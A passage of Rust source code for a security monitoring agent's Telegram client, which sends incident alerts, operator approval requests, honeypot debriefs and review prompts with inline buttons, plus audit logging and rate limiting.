use std::path::PathBuf;
use std::sync::Arc;
use std::time::Duration;

use anyhow::{Context, Result};
use innerwarden_core::incident::Incident;
use serde::Deserialize;
use tokio::sync::mpsc;
use tracing::{info, warn};

use super::explain_detector;
use super::formatting::{
    callback_data, country_flag_emoji, enforce_length, entity_summary, escape_html,
    first_ip_entity, format_incident_message, format_simple_message, host_tag, parse_callback,
    plain_action, reputation_action_phrase, reputation_score_bar, reputation_tier_label,
    sanitize_url, severity_label, source_icon, strip_bot_suffix,
};
use super::{ApprovalResult, GuardianMode};

/// Maximum automated alert messages per hour (excludes bot command responses).
const MAX_ALERTS_PER_HOUR: u32 = 10;

pub struct TelegramClient {
    bot_token: String,
    chat_id: String,
    dashboard_url: Option<String>,
    /// Dev mode: adds "Check FP" button to every notification.
    pub dev_mode: bool,
    http: reqwest::Client,
    /// Rate limiter: tracks last send time to stay within Telegram's 30 msg/sec limit.
    last_send: Arc<tokio::sync::Mutex<tokio::time::Instant>>,
    /// Hourly alert counter to prevent notification floods.
    alerts_this_hour: Arc<std::sync::atomic::AtomicU32>,
    /// Hour when the alert counter was last reset.
    alert_counter_hour: Arc<std::sync::atomic::AtomicU32>,
    /// Spec 024: when set via `INNERWARDEN_MOCK_TELEGRAM=1`, every outbound
    /// HTTP call is intercepted and appended as a JSONL line to this path
    /// instead of hitting api.telegram.org. Used by `scripts/scenario_qa.sh`
    /// so deterministic scenario runs never touch the real Telegram API and
    /// the outbox file becomes the authoritative record for envelope
    /// assertions. Path override via `INNERWARDEN_MOCK_TELEGRAM_PATH`.
    mock_outbox: Option<PathBuf>,
    /// Cumulative count of successful sendMessage calls in real API mode.
    /// This is wired to telemetry snapshots for spec-024 drift metrics.
    telegram_sent_counter: Option<Arc<std::sync::atomic::AtomicU64>>,
    /// 2026-05-01: persistent JSONL audit of every outbound Telegram
    /// message — incident alerts, daily digests, menu callbacks,
    /// manual approvals, integrity alerts. The JSONL file lives in
    /// `data_dir/telegram-sent.jsonl` and survives log rotation
    /// (unlike journald). Each line: `{ts, method, text, chat_id,
    /// has_keyboard}`. The journald `target: "telegram_audit"`
    /// stream still fires when env_filter allows it, but this file
    /// is the durable record the operator can grep / point an audit
    /// tool at without relying on journalctl retention. Set via
    /// `set_audit_jsonl_path` from the boot wiring.
    audit_jsonl: Option<PathBuf>,
    /// 2026-05-01: parallel JSONL of every send that FAILED (HTTP
    /// error, JSON parse error, Telegram API non-ok). Lives at
    /// `data_dir/telegram-failed.jsonl`. Pre-fix the integrity
    /// alerts and daily digests and manual approvals that hit a
    /// transient HTTP failure were silently lost. The WARN log was
    /// the only trace and journald rotation killed it within days.
    /// Now the operator has a durable record of "what was meant to
    /// send but didn't", which is the input for any retry/replay
    /// tool. Each line: `{ts, method, text, chat_id, error}`.
    failed_jsonl: Option<PathBuf>,
}

/// 2026-05-01: append a single JSON record as one line to `path`.
/// Used by the persistent telegram audit trail. Creates the parent
/// directory + file as needed. Caller must already hold the actor's
/// guarantee that concurrent writes are safe (the underlying OS
/// `O_APPEND` is atomic per write on Linux for lines < PIPE_BUF, and
/// our records are under 64KiB by construction).
fn append_jsonl_line(path: &std::path::Path, record: &serde_json::Value) -> std::io::Result<()> {
    if let Some(parent) = path.parent() {
        std::fs::create_dir_all(parent)?;
    }
    let mut f = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(path)?;
    use std::io::Write;
    writeln!(f, "{}", record)?;
    Ok(())
}

/// Returns the mock outbox path iff the process is running in mock telegram
/// mode. Exposed so tests and the scenario runner can locate the JSONL file
/// without duplicating the env var handling.
pub fn mock_outbox_from_env() -> Option<PathBuf> {
    let enabled = std::env::var("INNERWARDEN_MOCK_TELEGRAM")
        .map(|v| matches!(v.as_str(), "1" | "true" | "TRUE" | "True" | "yes"))
        .unwrap_or(false);
    if !enabled {
        return None;
    }
    let path = std::env::var("INNERWARDEN_MOCK_TELEGRAM_PATH")
        .map(PathBuf::from)
        .unwrap_or_else(|_| PathBuf::from("/tmp/telegram-outbox.jsonl"));
    Some(path)
}

impl TelegramClient {
    pub fn new(
        bot_token: impl Into<String>,
        chat_id: impl Into<String>,
        dashboard_url: Option<String>,
    ) -> Result<Self> {
        // Long-poll timeout is 25 s; give a 10 s buffer so the HTTP layer
        // never fires before the Telegram timeout parameter expires.
        let http = reqwest::Client::builder()
            .timeout(Duration::from_secs(35))
            .build()
            .context("failed to build Telegram HTTP client")?;
        let mock_outbox = mock_outbox_from_env();
        if let Some(path) = &mock_outbox {
            info!(path = %path.display(), "telegram client running in mock mode (spec 024)");
        }
        Ok(Self {
            bot_token: bot_token.into(),
            chat_id: chat_id.into(),
            dashboard_url,
            dev_mode: false,
            http,
            last_send: Arc::new(tokio::sync::Mutex::new(
                tokio::time::Instant::now() - Duration::from_secs(1),
            )),
            alerts_this_hour: Arc::new(std::sync::atomic::AtomicU32::new(0)),
            alert_counter_hour: Arc::new(std::sync::atomic::AtomicU32::new(
                chrono::Utc::now()
                    .format("%H")
                    .to_string()
                    .parse()
                    .unwrap_or(0),
            )),
            mock_outbox,
            telegram_sent_counter: None,
            audit_jsonl: None,
            failed_jsonl: None,
        })
    }

    /// Wire the persistent JSONL audit path (typically
    /// `data_dir/telegram-sent.jsonl`). Called once at boot from the
    /// agent wiring after the data_dir is known. When unset, the
    /// audit is journald-only.
    pub fn set_audit_jsonl_path(&mut self, path: PathBuf) {
        self.audit_jsonl = Some(path);
    }

    /// Wire the durable failed-send log path (typically
    /// `data_dir/telegram-failed.jsonl`). Called once at boot. When
    /// unset, send failures only emit a WARN log (lossy under log
    /// rotation).
    pub fn set_failed_jsonl_path(&mut self, path: PathBuf) {
        self.failed_jsonl = Some(path);
    }

    /// Returns true when this client is intercepting outbound HTTP to a mock
    /// JSONL outbox (spec 024 scenario harness). Primarily a hint for tests.
    #[allow(dead_code)]
    pub fn is_mock(&self) -> bool {
        self.mock_outbox.is_some()
    }

    pub fn set_telegram_sent_counter(&mut self, counter: Arc<std::sync::atomic::AtomicU64>) {
        self.telegram_sent_counter = Some(counter);
    }

    fn api_url(&self, method: &str) -> String {
        format!("https://api.telegram.org/bot{}/{}", self.bot_token, method)
    }

    // -----------------------------------------------------------------------
    // T.1 - Incident notification
    // -----------------------------------------------------------------------

    /// Send a notification message for a High/Critical incident.
    /// In GUARD mode the alert is compact - no action buttons, the agent will
    /// act and follow up with send_action_report(). In WATCH/DryRun mode the
    /// alert includes Block/Ignore quick-action buttons.
    /// When `is_simple` is true, uses plain language (no IPs, no detector names).
    /// Failures are logged as warnings and never propagate - fail-open.
    pub async fn send_incident_alert(
        &self,
        incident: &Incident,
        mode: GuardianMode,
        is_simple: bool,
    ) -> Result<()> {
        let text = if is_simple {
            format_simple_message(incident, self.dashboard_url.as_deref(), mode)
        } else {
            format_incident_message(incident, self.dashboard_url.as_deref(), mode)
        };

        let mut body = serde_json::json!({
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": true,
        });

        // Build inline keyboard based on mode.
        // Guard: compact — just "Not a threat" + "Investigate".
        // Watch/DryRun: operator decides — Block + Ignore + Investigate + "Not a threat".
        {
            let fp_label = if is_simple {
                "Not a threat"
            } else {
                "Report FP"
            };
            let fp_btn = serde_json::json!({
                "text": format!("\u{1f4dd} {fp_label}"),
                "callback_data": callback_data("fp:", &incident.incident_id)
            });

            match mode {
                GuardianMode::Guard => {
                    let mut row = vec![fp_btn];
                    if let Some(ip) = first_ip_entity(incident) {
                        if let Some(ref base_url) = self.dashboard_url {
                            let link = format!(
                                "{base_url}/?subject_type=ip&subject={ip}&date={}",
                                incident.ts.format("%Y-%m-%d")
                            );
                            row.push(serde_json::json!({
                                "text": "🔍 Investigate",
                                "url": link
                            }));
                        }
                    }
                    body["reply_markup"] = serde_json::json!({ "inline_keyboard": [row] });
                }
                GuardianMode::Watch | GuardianMode::DryRun => {
                    let mut keyboard: Vec<Vec<serde_json::Value>> = Vec::new();

                    if let Some(ip) = first_ip_entity(incident) {
                        keyboard.push(vec![
                            serde_json::json!({
                                "text": format!("🛡 Block {ip}"),
                                "callback_data": format!("quick:block:{ip}")
                            }),
                            serde_json::json!({
                                "text": "🙈 Ignore",
                                // Carry the incident id so the tap records a real
                                // false-positive signal (routed to __fp__ like the
                                // fp: button), not just a toast that claims it did.
                                "callback_data": callback_data("quick:ignore:", &incident.incident_id)
                            }),
                        ]);

                        if let Some(ref base_url) = self.dashboard_url {
                            let link = format!(
                                "{base_url}/?subject_type=ip&subject={ip}&date={}",
                                incident.ts.format("%Y-%m-%d")
                            );
                            keyboard.push(vec![serde_json::json!({
                                "text": "🔍 Investigate in dashboard",
                                "url": link
                            })]);
                        }
                    } else if let Some(ref base_url) = self.dashboard_url {
                        let link = format!("{base_url}/?date={}", incident.ts.format("%Y-%m-%d"));
                        keyboard.push(vec![serde_json::json!({
                            "text": "🔍 Investigate in dashboard",
                            "url": link
                        })]);
                    }

                    keyboard.push(vec![fp_btn]);
                    body["reply_markup"] = serde_json::json!({ "inline_keyboard": keyboard });
                }
            }
        }

        self.post_json("sendMessage", &body).await
    }

    /// Send a post-execution report when the agent autonomously acted on a threat.
    /// Called in GUARD mode after execute_decision succeeds.
    #[allow(clippy::too_many_arguments)]
    pub async fn send_action_report(
        &self,
        action_label: &str,
        target: &str,
        incident_title: &str,
        confidence: f32,
        host: &str,
        dry_run: bool,
        reputation: Option<&crate::abuseipdb::IpReputation>,
        geo: Option<&crate::geoip::GeoInfo>,
        cloudflare_pushed: bool,
    ) -> Result<()> {
        let pct = (confidence * 100.0) as u32;
        // Name the server this action was taken on (operator principle: every
        // notification names the server). Empty for a blank/unknown host.
        let host_tag = host_tag(host);

        // Build optional enrichment block
        let mut enrichment = String::new();
        if let Some(rep) = reputation {
            let bar = reputation_score_bar(rep.confidence_score);
            let country_part = geo
                .map(|g| {
                    let flag = country_flag_emoji(&g.country_code);
                    format!(" · {flag} {} · {}", g.country, g.isp)
                })
                .unwrap_or_default();
            enrichment = format!(
                "\n📊 AbuseIPDB: <b>{}/100</b> {bar}{country_part}",
                rep.confidence_score
            );
        } else if let Some(g) = geo {
            let flag = country_flag_emoji(&g.country_code);
            enrichment = format!("\n🌐 {flag} {} · {}", g.country, escape_html(&g.isp));
        }

        let cf_line = if cloudflare_pushed {
            "\n☁️ Pushed to Cloudflare edge too - blocked before they even reach your server."
        } else {
            ""
        };

        let text = if dry_run {
            format!(
                "\u{1f9ea} <b>Simulation</b>{host_tag}\n\
                 \n\
                 Would have {action_label} <code>{target}</code>\n\
                 {enrichment}\n\
                 <i>{incident_title}</i>\n\
                 \n\
                 Confidence: {pct}%. Dry-run, no real action.\n\
                 <i>Enable live mode to let me handle these.</i>",
                target = escape_html(target),
                incident_title = escape_html(incident_title),
            )
        } else if action_label.to_lowercase().contains("ignore") {
            format!(
                "\u{2705} <b>Analyzed &amp; cleared</b>{host_tag}\n\
                 \n\
                 <i>{incident_title}</i>{enrichment}\n\
                 \n\
                 Confidence: {pct}%. No action needed.",
                incident_title = escape_html(incident_title),
            )
        } else {
            let kill_quip = match pct {
                95..=100 => "Definitive match.",
                85..=94 => "High-confidence containment.",
                70..=84 => "Solid confidence. Monitoring for follow-up.",
                _ => "Contained. Keeping watch.",
            };
            format!(
                "\u{1f6e1}\u{fe0f} <b>Threat neutralized</b>{host_tag}\n\
                 \n\
                 {action_label} <code>{target}</code>{enrichment}\n\
                 <i>{incident_title}</i>\n\
                 \n\
                 Confidence: {pct}%. {kill_quip}{cf_line}",
                target = escape_html(target),
                incident_title = escape_html(incident_title),
            )
        };

        let body = serde_json::json!({
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": true,
        });
        self.post_json("sendMessage", &body).await
    }

    /// Send a raw HTML message (no formatting helpers).
    /// Used for mesh network notifications and other custom messages.
    /// Send an automated alert with hourly rate limiting.
    /// Use this for all automated notifications (not bot command responses).
    /// Returns Ok(()) silently if the hourly cap is reached.
    pub async fn send_alert_html(&self, html: &str) -> anyhow::Result<()> {
        use std::sync::atomic::Ordering;
        let current_hour: u32 = chrono::Utc::now()
            .format("%H")
            .to_string()
            .parse()
            .unwrap_or(0);
        let stored_hour = self.alert_counter_hour.load(Ordering::Relaxed);
        if current_hour != stored_hour {
            self.alerts_this_hour.store(0, Ordering::Relaxed);
            self.alert_counter_hour
                .store(current_hour, Ordering::Relaxed);
        }
        let count = self.alerts_this_hour.fetch_add(1, Ordering::Relaxed);
        if count >= MAX_ALERTS_PER_HOUR {
            if count == MAX_ALERTS_PER_HOUR {
                // Send one final warning, then stop
                let warning = format!(
                    "\u{26a0}\u{fe0f} <b>Alert flood detected</b>\n\n\
                     {} alerts this hour. Pausing automated notifications.\n\
                     Check the dashboard for details. Alerts resume next hour.",
                    count
                );
                self.send_raw_html(&warning).await.ok();
            }
            return Ok(());
        }
        self.send_raw_html(html).await
    }

    pub async fn send_raw_html(&self, html: &str) -> anyhow::Result<()> {
        let body = serde_json::json!({
            "chat_id": self.chat_id,
            "text": html,
            "parse_mode": "HTML",
            "disable_web_page_preview": true,
        });
        self.post_json("sendMessage", &body).await
    }

    /// Send an agent-guard snitch alert when an AI agent attempts something dangerous.
    pub async fn send_agent_guard_alert(
        &self,
        alert: &crate::dashboard::AgentGuardAlert,
    ) -> Result<()> {
        let sev_emoji = match alert.severity.as_str() {
            "high" => "\u{1f534}",   // 🔴
            "medium" => "\u{1f7e0}", // 🟠
            _ => "\u{1f7e1}",        // 🟡
        };
        let rec_label = match alert.recommendation.as_str() {
            "deny" => "DENIED",
            "review" => "REVIEW",
            _ => &alert.recommendation,
        };
        // `&alert.command[..120]` panicked on a multi-byte UTF-8 boundary;
        // command_preview backs up to a char boundary and adds an ellipsis
        // only when it actually truncates.
        let cmd_preview = crate::text_util::command_preview(&alert.command, 120);
        let signals_str = if alert.signals.is_empty() {
            "—".to_string()
        } else {
            alert.signals.join(", ")
        };
        let atr_line = if alert.atr_rule_ids.is_empty() {
            String::new()
        } else {
            format!("\n<b>ATR rules:</b> {}", alert.atr_rule_ids.join(", "))
        };

        let html = format!(
            "\u{1f916} <b>Agent Guard Alert</b>\n\n\
             {sev_emoji} <b>{}</b> — {rec_label}\n\n\
             <b>Agent:</b> {}\n\
             <b>Command:</b> <code>{}</code>\n\
             <b>Risk score:</b> {}\n\
             <b>Signals:</b> {}{}\n\n\
             InnerWarden flagged this action by your AI agent.",
            alert.severity.to_uppercase(),
            escape_html(&alert.agent_name),
            escape_html(&cmd_preview),
            alert.risk_score,
            escape_html(&signals_str),
            atr_line,
        );
        self.send_alert_html(&html).await
    }

    /// Send the onboarding/welcome message when the operator opens the bot.
    /// Shows current mode, today's stats, and quick-action buttons.
    pub async fn send_onboarding(
        &self,
        host: &str,
        incident_count: usize,
        decision_count: usize,
        mode: GuardianMode,
    ) -> Result<()> {
        let mode_label = mode.label();
        let mode_desc = mode.description();

        let today_line = if incident_count == 0 {
            "Perimeter's clean - no threat actors in the logs today.".to_string()
        } else {
            format!(
                "<b>{incident_count}</b> intrusion attempt{} logged, <b>{decision_count}</b> neutralized.",
                if incident_count == 1 { "" } else { "s" },
            )
        };

        let text = format!(
            "🛡 <b>InnerWarden</b> - protecting <b>{host}</b>\n\
             \n\
             {today_line}\n\
             \n\
             Mode: <b>{mode_label}</b>\n\
             <i>{mode_desc}</i>",
            host = escape_html(host),
        );

        let body = serde_json::json!({
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "reply_markup": {
                "inline_keyboard": [
                    [
                        { "text": "📊 Status",    "callback_data": "menu:status"    },
                        { "text": "🚨 Threats",   "callback_data": "menu:threats"   },
                        { "text": "⚖️ Decisions", "callback_data": "menu:decisions" }
                    ],
                    [
                        { "text": "🔇 Quiet",   "callback_data": "sensitivity:quiet"   },
                        { "text": "🔔 Normal",  "callback_data": "sensitivity:normal"  },
                        { "text": "🔊 Verbose", "callback_data": "sensitivity:verbose" }
                    ],
                    [
                        { "text": "\u{1f5d1}\u{fe0f} Undo allowlist", "callback_data": "menu:undo"  },
                        { "text": "❓ All commands",  "callback_data": "menu:help"      }
                    ]
                ]
            }
        });
        self.post_json("sendMessage", &body).await
    }

    // -----------------------------------------------------------------------
    // T.2 - Confirmation request (inline keyboard: Approve / Reject)
    // -----------------------------------------------------------------------

    /// Send a confirmation-request message with Approve/Reject inline keyboard.
    /// Returns the Telegram message ID so the caller can track the pending approval.
    pub async fn send_confirmation_request(
        &self,
        incident: &Incident,
        action_description: &str,
        action_name: &str,
        confidence: f32,
        expires_secs: u64,
    ) -> Result<i64> {
        let sev = severity_label(incident);
        let source_icon = source_icon(&incident.tags);
        let entity_line = entity_summary(incident);
        let pct = (confidence * 100.0) as u32;

        let confidence_phrase = match pct {
            90..=100 => "High confidence - this is a real threat",
            75..=89 => "Strong signal - TTPs check out",
            60..=74 => "Moderate confidence - worth acting on",
            _ => "Low signal - could be noise, could be legit",
        };
        let action_plain = plain_action(action_description);
        let expires_min = expires_secs / 60;
        let expires_label = if expires_min >= 1 {
            format!("{expires_min} min")
        } else {
            format!("{expires_secs}s")
        };

        let text = format!(
            "{source_icon} {sev}\n\
             <b>{title}</b>\n\
             {entity_line}\n\
             \n\
             🤖 {confidence_phrase} ({pct}%). Recommended action:\n\
             <code>{action_plain}</code>\n\
             \n\
             Your call, operator - {expires_label} to respond.",
            title = escape_html(&incident.title),
            action_plain = escape_html(&action_plain),
            entity_line = entity_line,
            sev = sev,
            source_icon = source_icon,
            confidence_phrase = confidence_phrase,
            expires_label = expires_label,
            pct = pct,
        );

        let id = &incident.incident_id;
        let always_label = format!("🔁 Always {action_name}");
        let body = serde_json::json!({
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "reply_markup": {
                "inline_keyboard": [[
                    { "text": "✅ Approve", "callback_data": format!("approve:{id}") },
                    { "text": always_label, "callback_data": format!("always:{id}") },
                    { "text": "❌ Reject", "callback_data": format!("reject:{id}") }
                ]]
            }
        });

        let resp = self.post_json_with_response("sendMessage", &body).await?;
        let msg_id = resp["result"]["message_id"]
            .as_i64()
            .context("Telegram sendMessage returned no message_id")?;
        Ok(msg_id)
    }

    // -----------------------------------------------------------------------
    // Honeypot operator-in-the-loop suggestion
    // -----------------------------------------------------------------------

    /// Send a honeypot suggestion message with a 4-button choice keyboard.
    ///
    /// Sent when the AI recommends `Honeypot` (or when `block_ip` is decided and honeypot
    /// is an allowed skill) so the operator can choose what to do with the attacker.
    ///
    /// Returns the Telegram `message_id` for pending-choice tracking.
    pub async fn send_honeypot_suggestion(
        &self,
        incident: &Incident,
        ip: &str,
        ai_reason: &str,
        ai_confidence: f32,
        ai_suggested: &str, // "honeypot" | "block" | "monitor"
    ) -> Result<i64> {
        let pct = (ai_confidence * 100.0) as u32;

        let text = format!(
            "🎯 <b>Honeypot candidate detected</b>\n\
             \n\
             <b>IP:</b> <code>{ip}</code>\n\
             <b>Incident:</b> {title}\n\
             <b>AI read:</b> {reason} ({pct}% confidence)\n\
             \n\
             Redirect to honeypot for analysis, or block immediately?",
            ip = escape_html(ip),
            title = escape_html(&incident.title),
            reason = escape_html(ai_reason),
            pct = pct,
        );

        // Add ✓ checkmark to the AI-suggested action
        let honeypot_label = if ai_suggested == "honeypot" {
            "🍯 Honeypot ✓"
        } else {
            "🍯 Honeypot"
        };
        let block_label = if ai_suggested == "block" {
            "🚫 Block ✓"
        } else {
            "🚫 Block"
        };
        let monitor_label = if ai_suggested == "monitor" {
            "👁 Monitor ✓"
        } else {
            "👁 Monitor"
        };

        let body = serde_json::json!({
            "chat_id": self.chat_id,
            "text": text,
            "parse_mode": "HTML",
            "disable_web_page_preview": true,
            "reply_markup": {
                "inline_keyboard": [
                    [
                        { "text": honeypot_label, "callback_data": format!("hpot:honeypot:{ip}") },
                        { "text": block_label,    "callback_data": format!("hpot:block:{ip}")    }
                    ],
                    [
                        { "text": monitor_label,  "callback_data": format!("hpot:monitor:{ip}")  },
                        { "text": "❌ Ignore",    "callback_data": format!("hpot:ignore:{ip}")   }
                    ]
                ]
            }
        });

        let resp = self.post_json_with_response("sendMessage", &body).await?;
        let msg_id = resp["result"]["message_id"]
            .as_i64()
            .context("Telegram sendMessage returned no message_id")?;
        Ok(msg_id)
    }

    // -----------------------------------------------------------------------
    // Spec 062 Phase 3 - needs_review operator-in-the-loop
    // -----------------------------------------------------------------------

    /// Send a `needs_review` notification with a 3-button choice keyboard.
    ///
    /// Sent when an ambiguous incident reaches `mark_needs_review` and no
    /// automated layer confidently decided it (spec 062 Phase 1). The operator
    /// resolves it directly from Telegram: Block / Ignore / Dismiss. The tap is
    /// routed back through `bot_actions::handle_telegram_action_callback` via the
    /// `__review__:{incident_id}` sentinel, which writes the terminal decision —
    /// that makes it the incident's most-recent decision, so the Phase 2 timeout
    /// sweep stops treating it as pending.
    ///
    /// Returns the Telegram `message_id`.
    ///
    /// callback_data carries the raw `incident_id`. Telegram caps callback_data
    /// at 64 bytes; `review:dismiss:` is 15 bytes, leaving 49 for the id. In-tree
    /// incident_ids fit comfortably; a pathologically long id would make the
    /// sendMessage fail loudly (Result propagated), never silently mis-route.
    pub async fn send_needs_review_request(&self, incident: &Incident) -> Result<i64> {
        let body = serde_json::json!({
            "chat_id": self.chat_id,
            "text": Self::needs_review_text(incident),
            "parse_mode": "HTML",
            "disable_web_page_preview": true,
            "reply_markup": {
                "inline_keyboard": Self::needs_review_keyboard(&incident.incident_id),
            }
        });

        let resp = self.post_json_with_response("sendMessage", &body).await?;
        let msg_id = resp["result"]["message_id"]
            .as_i64()
            .context("Telegram sendMessage returned no message_id")?;
        Ok(msg_id)
    }

    /// Pure: the HTML body of a needs_review notification. Extracted so the
    /// IP/title/severity rendering is unit-testable without an HTTP round-trip.
    fn needs_review_text(incident: &Incident) -> String {
        let ip = incident
            .entities
            .iter()
            .find(|e| e.r#type == innerwarden_core::entities::EntityType::Ip)
            .map(|e| e.value.clone())
            .unwrap_or_else(|| "unknown".to_string());

        // Spec 067 Phase 1: the operator was gating a real action (Block /
        // Ignore / Dismiss) with only title + IP + severity. Surface the
        // detector, what happened, what to check, and MITRE tags — everything
        // already on the incident — so the decision can be made from the alert
        // instead of opening the dashboard.
        let detector = incident
            .incident_id
            .split(':')
            .next()
            .unwrap_or("")
            .strip_prefix("graph_")
            .or(incident.incident_id.split(':').next())
            .unwrap_or("");

        let mut out = format!(
            "🔎 <b>Needs your review</b>\n\
             \n\
             <b>IP:</b> <code>{ip}</code>\n\
             <b>Detector:</b> {detector}\n\
             <b>Incident:</b> {title}\n\
             <b>Severity:</b> {severity}\n",
            ip = escape_html(&ip),
            detector = escape_html(detector),
            title = escape_html(&incident.title),
            severity = escape_html(&format!("{:?}", incident.severity)),
        );

        let summary = incident.summary.trim();
        if !summary.is_empty() && summary != incident.title.trim() {
            let s = if summary.chars().count() > 300 {
                let cut: String = summary.chars().take(300).collect();
                format!("{cut}…")
            } else {
                summary.to_string()
            };
            out.push_str(&format!("\n<b>What happened:</b> {}\n", escape_html(&s)));
        }

        let checks: Vec<&String> = incident.recommended_checks.iter().take(3).collect();
        if !checks.is_empty() {
            out.push_str("\n<b>Check:</b>\n");
            for c in checks {
                out.push_str(&format!("• {}\n", escape_html(c)));
            }
        }

        let mitre: Vec<&String> = incident
            .tags
            .iter()
            .filter(|t| {
                t.starts_with('T') && t[1..].chars().next().is_some_and(|c| c.is_ascii_digit())
            })
            .take(6)
            .collect();
        if !mitre.is_empty() {
            let joined = mitre
                .iter()
                .map(|t| t.as_str())
                .collect::<Vec<_>>()
                .join(", ");
            out.push_str(&format!("\n<b>MITRE:</b> {}\n", escape_html(&joined)));
        }

        out.push_str("\nThe Warden could not confidently decide this one. What should it do?");
        out
    }

    /// Pure: the 3-button inline keyboard (Block / Ignore / Dismiss). Extracted
    /// so the `review:{action}:{incident_id}` callback_data construction — the
    /// piece that must round-trip through `bot_actions` — is unit-testable.
    fn needs_review_keyboard(incident_id: &str) -> serde_json::Value {
        serde_json::json!([
            [
                { "text": "🚫 Block",   "callback_data": format!("review:block:{incident_id}")   },
                { "text": "🙈 Ignore",  "callback_data": format!("review:ignore:{incident_id}")  }
            ],
            [
                { "text": "🗑 Dismiss", "callback_data": format!("review:dismiss:{incident_id}") }
            ]
        ])
    }

    /// Pure: toast text shown when the operator taps a needs_review button.
    fn review_action_toast(action: &str) -> String {
        match action {
            "block" => "🚫 Blocking the attacker at the firewall...".to_string(),
            "ignore" => "🙈 Ignoring - logging as a non-threat.".to_string(),
            "dismiss" => "🗑 Dismissing this one - won't bug you again.".to_string(),
            _ => "👍 Logged.".to_string(),
        }
    }

    /// Pure: reaction emoji for a needs_review button tap.
    fn review_action_emoji(action: &str) -> &'static str {
        match action {
            "block" => "\u{1f6ab}",
            "ignore" => "\u{1f648}",
            "dismiss" => "\u{1f5d1}\u{fe0f}",
            _ => "\u{1f44d}",
        }
    }

    /// Edit a confirmation message to show the final outcome (removes the keyboard).
    pub async fn resolve_confirmation(
        &self,
        message_id: i64,
        approved: bool,
        always: bool,
        operator: &str,
    ) -> Result<()> {
        let body = serde_json::json!({
            "chat_id": self.chat_id,
            "message_id": message_id,
            "reply_markup": { "inline_keyboard": [] }
        });
        // Remove inline keyboard
        let _ = self.post_json("editMessageReplyMarkup", &body).await;

        // Send follow-up result message with hacker personality
        let text = if always {
            format!(
                "🔁 Trust rule saved, {operator}. This TTP is now auto-contained - no need to ping you next time.",
                operator = escape_html(operator)
            )
        } else if approved {
            format!(
                "✅ Executed. {operator} called the shot - threat actor has been neutralized.",
                operator = escape_html(operator)
            )
        } else {
            format!(
                "❌ Standing down on {operator}'s call. Logging the IOC, keeping eyes on it.",
                operator = escape_html(operator)
            )
        };
        let body2 = serde_json::json!({
            "chat_id": self.chat_id,
            "text": text,
            "reply_to_message_id": message_id,
        });
        self.post_json("sendMessage", &body2).await
    }

    // -----------------------------------------------------------------------
    // T.5 - Post-session honeypot report
    // -----------------------------------------------------------------------

    /// T.5 - Post-session report sent after a honeypot session ends.
    /// Summarizes commands, extracted IOCs, AI verdict, and offers a Block action.
    #[allow(clippy::too_many_arguments)]
    pub async fn send_honeypot_session_report(
        &self,
        ip: &str,
        session_id: &str,
        duration_secs: u64,
        commands: &[String],
        credentials: &[(String, Option<String>)], // (username, password)
        iocs: &crate::ioc::ExtractedIocs,
        ai_verdict: &str,
        auto_blocked: bool,
    ) -> Result<()> {
        let mut lines = Vec::new();
        lines.push(format!(
            "🍯 <b>Honeypot debrief</b> - session over\n\n\
             <b>Attacker:</b> <code>{ip}</code>\n\
             <b>Session:</b> <code>{session_id}</code>\n\
             <b>Duration:</b> {duration_secs}s | <b>Commands captured:</b> {}",
            commands.len(),
            ip = escape_html(ip),
            session_id = escape_html(session_id),
        ));

        // Credentials tried
        if !credentials.is_empty() {
            let mut cred_block = "\n<b>Credentials tried:</b>\n".to_string();
            for (user, pass) in credentials.iter().take(10) {
                let pass_display = pass
                    .as_deref()
                    .map(|p| {
                        if p.len() > 20 {
                            // Wave 1 (AUDIT-WAVE1-UTF8): attacker-supplied
                            // process names appearing in Telegram alerts
                            // could DoS via multi-byte UTF-8 at byte 20.
                            format!("{}...", crate::text_util::safe_truncate(p, 20))
                        } else {
                            p.to_string()
                        }
                    })
                    .unwrap_or_else(|| "(key auth)".to_string());
                cred_block.push_str(&format!(
                    "  <code>{}</code> / <code>{}</code>\n",
                    escape_html(user),
                    escape_html(&pass_display)
                ));
            }
            if credentials.len() > 10 {
                cred_block.push_str(&format!("  ... +{} more\n", credentials.len() - 10));
            }
            lines.push(cred_block.trim_end().to_string());
        }

        if !commands.is_empty() {
            let mut cmd_block = "\n<b>Their playbook:</b>\n".to_string();
            for cmd in commands.iter().take(8) {
                cmd_block.push_str(&format!("  $ <code>{}</code>\n", escape_html(cmd)));
            }
            lines.push(cmd_block.trim_end().to_string());
        }

        if credentials.is_empty() && commands.is_empty() {
            lines.push(
                "\nℹ️ Probe-only session: no auth attempts or shell commands captured.".to_string(),
            );
        }

        if !iocs.is_empty() {
            let ioc_text = iocs.format_telegram();
            if !ioc_text.is_empty() {
                lines.push(format!("\n<b>Extracted IOCs:</b>\n{ioc_text}"));
            }
        }

        lines.push(format!("\n<b>AI verdict:</b> {}", escape_html(ai_verdict)));

        if auto_blocked {
            lines.push("\n✅ IP auto-blocked - they walked right into it.".to_string());
        }

        let text = lines.join("\n");

        // Build inline keyboard
        let mut keyboard_rows: Vec<Vec<serde_json::Value>> = vec![];

        if !auto_blocked {
            // Spec 067 Phase 1 fix: the debrief is sent AFTER the honeypot
            // session ends, so there is no live `pending_honeypot_choices`
            // entry — the old `hpot:block:` callback always hit "that choice
            // expired". Route the post-session block through the gated
            // quick-block path instead, which needs no pending entry.
            keyboard_rows.push(vec![serde_json::json!({
                "text": "🚫 Block now",
                "callback_data": format!("quick:block:{ip}")
            })]);
        }

        if let Some(ref dash_url) = self.dashboard_url {
            keyboard_rows.push(vec![serde_json::json!({
                "text": "📊 View in dashboard",
                "url": dash_url
            })]);
        }

        let body = if keyboard_rows.is_empty() {
            serde_json::json!({
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": true,
            })
        } else {
            serde_json::json!({
                "chat_id": self.chat_id,
                "text": text,
                "parse_mode": "HTML",
                "disable_web_page_preview": true,
                "reply_markup": {
                    "inline_keyboard": keyboard_rows
                }
            })
        };

        self.post_json("sendMessage", &body).await
    }

    // -----------------------------------------------------------------------
    // AbuseIPDB auto-block notification
    // -----------------------------------------------------------------------

    /// Notify operator when an IP is auto-blocked via AbuseIPDB threshold
    /// (no AI call was made - pure reputation gate).
    #[allow(clippy::too_many_arguments)]
